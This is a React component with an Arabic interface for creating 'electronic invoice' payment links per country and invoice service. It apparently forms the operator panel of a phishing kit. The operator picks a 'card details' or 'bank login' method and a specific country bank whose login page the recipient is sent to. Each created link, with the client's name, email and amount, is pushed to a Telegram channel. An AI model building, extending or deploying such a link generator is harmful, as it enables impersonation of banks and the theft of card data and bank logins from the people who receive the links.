import { useState, useMemo } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { useCreateLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { getInvoiceServicesByCountry } from "@/lib/invoiceServices";
import { getBanksByCountry } from "@/lib/banks";
import { getCurrencySymbol, getCurrencyName, formatCurrency } from "@/lib/countryCurrencies";
import { getCurrency, getDefaultTitle } from "@/utils/countryData";
import { generatePaymentLink } from "@/utils/paymentLinks";
import { FileText, Hash, Mail, DollarSign, Calendar, User, Building2, Copy, ExternalLink, CreditCard } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import TelegramTest from "@/components/TelegramTest";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";

const CreateInvoiceLink = () => {
  const { country } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const createLink = useCreateLink();
  const countryData = getCountryByCode(country?.toUpperCase() || "");
  const services = getInvoiceServicesByCountry(country?.toUpperCase() || "");

  const [selectedService, setSelectedService] = useState("");
  const [invoiceNumber, setInvoiceNumber] = useState("");
  const [clientName, setClientName] = useState("");
  const [clientEmail, setClientEmail] = useState("");
  const [amount, setAmount] = useState("1000");
  const [serviceDescription, setServiceDescription] = useState("");
  const [dueDate, setDueDate] = useState("");
  const [paymentMethod, setPaymentMethod] = useState("card");
  const [selectedBank, setSelectedBank] = useState("");
  const [showSuccessDialog, setShowSuccessDialog] = useState(false);
  const [createdPaymentUrl, setCreatedPaymentUrl] = useState("");
  const [linkId, setLinkId] = useState("");
  const [copied, setCopied] = useState(false);

  const banks = useMemo(() => getBanksByCountry(country?.toUpperCase() || ""), [country]);

  const selectedServiceData = useMemo(() =>
    services.find(s => s.key === selectedService),
    [services, selectedService]
  );

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!selectedService || !invoiceNumber || !clientName || !amount) {
      toast({
        title: "خطأ",
        description: "الرجاء ملء جميع الحقول المطلوبة",
        variant: "destructive",
      });
      return;
    }

    try {
      const link = await createLink.mutateAsync({
        type: "invoice",
        country_code: country || "",
        payload: {
          service_key: selectedService,
          service_name: selectedServiceData?.name || selectedService,
          invoice_number: invoiceNumber,
          client_name: clientName,
          client_email: clientEmail,
          amount: parseFloat(amount) || 0,
          service_description: serviceDescription,
          due_date: dueDate,
          payment_method: paymentMethod,
          selected_bank: paymentMethod === "bank_login" ? selectedBank : null,
          selectedCountry: country || "SA",
        },
      });

      const paymentUrl = generatePaymentLink({
        invoiceId: link.id,
        company: selectedService,
        country: country || 'SA'
      });

      const telegramResult = await sendToTelegram({
        type: 'invoice_created',
        data: {
          invoice_number: invoiceNumber,
          client_name: clientName,
          client_email: clientEmail,
          amount: parseFloat(amount) || 0,
          service_name: selectedServiceData?.name || selectedService,
          service_description: serviceDescription,
          due_date: dueDate,
          country: countryData.nameAr,
          payment_url: `${window.location.origin}/r/${country}/${link.type}/${link.id}?company=${selectedService}`
        },
        timestamp: new Date().toISOString(),
        description: selectedServiceData?.description
      });

      setCreatedPaymentUrl(paymentUrl);
      setLinkId(link.id);
      setShowSuccessDialog(true);

      if (telegramResult.success) {
        toast({
          title: "تم الإرسال بنجاح",
          description: "تم إرسال البيانات إلى التليجرام",
        });
      } else {
        console.error('Telegram error:', telegramResult.error);
        toast({
          title: "تحذير",
          description: "تم إنشاء الرابط ولكن فشل في إرسال البيانات إلى التليجرام",
          variant: "destructive",
        });
      }
    } catch (error) {
      console.error("Error creating link:", error);
    }
  };

  const handleCopyLink = () => {
    navigator.clipboard.writeText(createdPaymentUrl);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
    toast({
      title: "تم النسخ!",
      description: "تم نسخ الرابط إلى الحافظة",
    });
  };

  const handlePreview = () => {
    window.open(createdPaymentUrl, '_blank');
  };

  if (!countryData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
        <div className="text-center p-8">
          <FileText className="w-16 h-16 mx-auto mb-4 text-muted-foreground" />
          <h2 className="text-2xl font-bold mb-2 text-foreground">الدولة غير موجودة</h2>
          <p className="text-muted-foreground mb-6">الرجاء اختيار دولة صحيحة</p>
          <Button onClick={() => navigate('/services')}>العودة للخدمات</Button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen py-4 bg-gradient-to-b from-background to-secondary/20" dir="rtl">
      <div className="container mx-auto px-4">
        <div className="mb-6">
          <TelegramTest />
        </div>

        <div className="max-w-2xl mx-auto">
          <Card className="p-4 shadow-elevated">
            <div
              className="h-16 -m-4 mb-4 rounded-t-xl relative"
              style={{
                background: `linear-gradient(135deg, ${countryData.primaryColor}, ${countryData.secondaryColor})`,
              }}
            >
              <div className="absolute inset-0 bg-black/20 rounded-t-xl" />
              <div className="absolute bottom-2 right-4 text-white">
                <h1 className="text-lg font-bold">إنشاء فاتورة إلكترونية</h1>
                <p className="text-xs opacity-90">{countryData.nameAr}</p>
              </div>
            </div>

            <form onSubmit={handleSubmit} className="space-y-4">
              {/* Service Selection */}
              <div>
                <Label className="mb-2 text-sm">خدمة الفواتير *</Label>
                <Select value={selectedService} onValueChange={setSelectedService}>
                  <SelectTrigger className="h-10">
                    <SelectValue placeholder="اختر خدمة الفواتير" />
                  </SelectTrigger>
                  <SelectContent className="bg-background z-50">
                    {services.map((service) => (
                      <SelectItem key={service.id} value={service.key}>
                        {service.name}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>

              {/* Service Description */}
              {selectedService && selectedServiceData && (
                <div className="p-3 rounded-lg border border-border bg-card/50">
                  <h3 className="font-semibold text-sm mb-1">{selectedServiceData.name}</h3>
                  <p className="text-xs text-muted-foreground">{selectedServiceData.description}</p>
                </div>
              )}

              {/* Invoice Number */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <Hash className="w-3 h-3" />
                  رقم الفاتورة *
                </Label>
                <Input
                  value={invoiceNumber}
                  onChange={(e) => setInvoiceNumber(e.target.value)}
                  placeholder="مثال: INV-2024-001"
                  className="h-9 text-sm"
                  required
                />
              </div>

              {/* Client Name */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <User className="w-3 h-3" />
                  اسم العميل *
                </Label>
                <Input
                  value={clientName}
                  onChange={(e) => setClientName(e.target.value)}
                  placeholder="اسم العميل الكامل"
                  className="h-9 text-sm"
                  required
                />
              </div>

              {/* Client Email */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <Mail className="w-3 h-3" />
                  بريد العميل الإلكتروني
                </Label>
                <Input
                  type="email"
                  value={clientEmail}
                  onChange={(e) => setClientEmail(e.target.value)}
                  placeholder="example@email.com"
                  className="h-9 text-sm"
                />
              </div>

              {/* Amount */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <DollarSign className="w-3 h-3" />
                  المبلغ *
                  {country && (
                    <span className="text-xs text-muted-foreground">
                      ({getCurrencyName(country)})
                    </span>
                  )}
                </Label>
                <Input
                  type="number"
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  placeholder={country ? `0.00 ${getCurrencySymbol(country)}` : "0.00"}
                  className="h-9 text-sm"
                  step="0.01"
                  min="0"
                  required
                />
                {country && (
                  <p className="text-xs text-muted-foreground mt-1">
                    💱 العملة: {getCurrencyName(country)} ({getCurrencySymbol(country)})
                  </p>
                )}
              </div>

              {/* Service Description */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <FileText className="w-3 h-3" />
                  وصف الخدمة
                </Label>
                <Input
                  value={serviceDescription}
                  onChange={(e) => setServiceDescription(e.target.value)}
                  placeholder="وصف مختصر للخدمة المقدمة"
                  className="h-9 text-sm"
                />
              </div>

              {/* Due Date */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <Calendar className="w-3 h-3" />
                  تاريخ الاستحقاق
                </Label>
                <Input
                  type="date"
                  value={dueDate}
                  onChange={(e) => setDueDate(e.target.value)}
                  className="h-9 text-sm"
                />
              </div>

              {/* Payment Method Selection */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <CreditCard className="w-3 h-3" />
                  طريقة الدفع *
                </Label>
                <Select value={paymentMethod} onValueChange={setPaymentMethod}>
                  <SelectTrigger className="h-10">
                    <SelectValue placeholder="اختر طريقة الدفع" />
                  </SelectTrigger>
                  <SelectContent className="bg-background z-50">
                    <SelectItem value="card">
                      <div className="flex items-center gap-2">
                        <CreditCard className="w-4 h-4" />
                        <span>بيانات البطاقة</span>
                      </div>
                    </SelectItem>
                    <SelectItem value="bank_login">
                      <div className="flex items-center gap-2">
                        <Building2 className="w-4 h-4" />
                        <span>تسجيل دخول البنك</span>
                      </div>
                    </SelectItem>
                  </SelectContent>
                </Select>
                <p className="text-xs text-muted-foreground mt-1">
                  {paymentMethod === "card"
                    ? "🔒 سيُطلب من العميل إدخال بيانات البطاقة"
                    : "🏦 سيُطلب من العميل تسجيل الدخول للبنك"}
                </p>
              </div>

              {/* Bank Selection (Only for bank_login) */}
              {paymentMethod === "bank_login" && (
                <div>
                  <Label className="mb-2 flex items-center gap-2 text-sm">
                    <Building2 className="w-3 h-3" />
                    اختر البنك *
                  </Label>
                  <Select value={selectedBank} onValueChange={setSelectedBank}>
                    <SelectTrigger className="h-10">
                      <SelectValue placeholder="اختر البنك" />
                    </SelectTrigger>
                    <SelectContent className="bg-background z-50">
                      {banks.map((bank) => (
                        <SelectItem key={bank.id} value={bank.id}>
                          <div className="flex items-center gap-2">
                            {bank.logo && (
                              <img
                                src={bank.logo}
                                alt={bank.nameAr}
                                className="h-5 w-5 object-contain"
                                onError={(e) => e.currentTarget.style.display = 'none'}
                              />
                            )}
                            <span>{bank.nameAr}</span>
                          </div>
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                  <p className="text-xs text-muted-foreground mt-1">
                    💡 سيتم توجيه العميل لصفحة تسجيل دخول {banks.find(b => b.id === selectedBank)?.nameAr || 'البنك'}
                  </p>
                </div>
              )}

              {/* Submit Button */}
              <Button
                type="submit"
                className="w-full py-5"
                disabled={createLink.isPending}
              >
                {createLink.isPending ? (
                  <span className="text-sm">جاري الإنشاء...</span>
                ) : (
                  <>
                    <FileText className="w-4 h-4 ml-2" />
                    <span className="text-sm">إنشاء فاتورة إلكترونية</span>
                  </>
                )}
              </Button>
            </form>
          </Card>
        </div>
      </div>

      {/* Success Dialog */}
      <AlertDialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
        <AlertDialogContent className="max-w-md" dir="rtl">
          <AlertDialogHeader>
            <AlertDialogTitle className="text-xl text-center">
              ✅ تم إنشاء الفاتورة بنجاح!
            </AlertDialogTitle>
            <AlertDialogDescription className="text-center">
              يمكنك نسخ الرابط أو معاينته قبل المتابعة
            </AlertDialogDescription>
          </AlertDialogHeader>

          <div className="my-4">
            {/* Invoice Summary */}
            <div className="bg-secondary/50 p-4 rounded-lg mb-4 space-y-2">
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">رقم الفاتورة:</span>
                <span className="font-semibold">{invoiceNumber}</span>
              </div>
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">العميل:</span>
                <span className="font-semibold">{clientName}</span>
              </div>
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">المبلغ:</span>
                <span className="font-semibold">
                  {formatCurrency(parseFloat(amount) || 0, country || "SA")}
                </span>
              </div>
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">العملة:</span>
                <span className="font-semibold">{getCurrencyName(country || "SA")}</span>
              </div>
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">تاريخ الاستحقاق:</span>
                <span className="font-semibold">{dueDate || 'غير محدد'}</span>
              </div>
            </div>

            <div className="bg-secondary/50 p-3 rounded-lg mb-3 break-all text-xs">
              {createdPaymentUrl}
            </div>

            <div className="flex gap-2">
              <Button
                onClick={handleCopyLink}
                variant="outline"
                className="flex-1"
              >
                {copied ? (
                  <>
                    <Copy className="w-4 h-4 ml-2" />
                    تم النسخ!
                  </>
                ) : (
                  <>
                    <Copy className="w-4 h-4 ml-2" />
                    نسخ الرابط
                  </>
                )}
              </Button>

              <Button
                onClick={handlePreview}
                variant="outline"
                className="flex-1"
              >
                <ExternalLink className="w-4 h-4 ml-2" />
                معاينة
              </Button>
            </div>
          </div>
        </AlertDialogContent>
      </AlertDialog>
    </div>
  );
};

export default CreateInvoiceLink;
